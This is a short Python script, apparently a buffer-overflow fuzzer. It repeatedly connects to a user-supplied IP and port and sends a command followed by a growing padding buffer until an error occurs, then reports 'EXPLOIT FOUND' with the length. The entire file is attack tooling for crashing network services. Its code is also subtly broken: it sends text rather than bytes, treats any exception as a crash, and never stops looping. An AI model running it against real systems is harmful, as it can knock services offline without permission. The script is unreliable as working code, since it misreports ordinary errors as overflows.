import socket
import sys
from time import sleep

char = input("ENTER THE CHAR: ")
ip = input("ENTER THE IP: ")
port = int(input("ENTER THE PORT: "))
add = int(input("ENTER THE ADD: "))
command = input("ENTER THE COMMAND: ")
buffer = char * 100

while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((ip, port))
		s.send((command + buffer))
		s.close()
		sleep(1)
		buffer = buffer + (char * add)
	except:
		print(f"EXPLOIT FOUND AT [!] {len(buffer)}")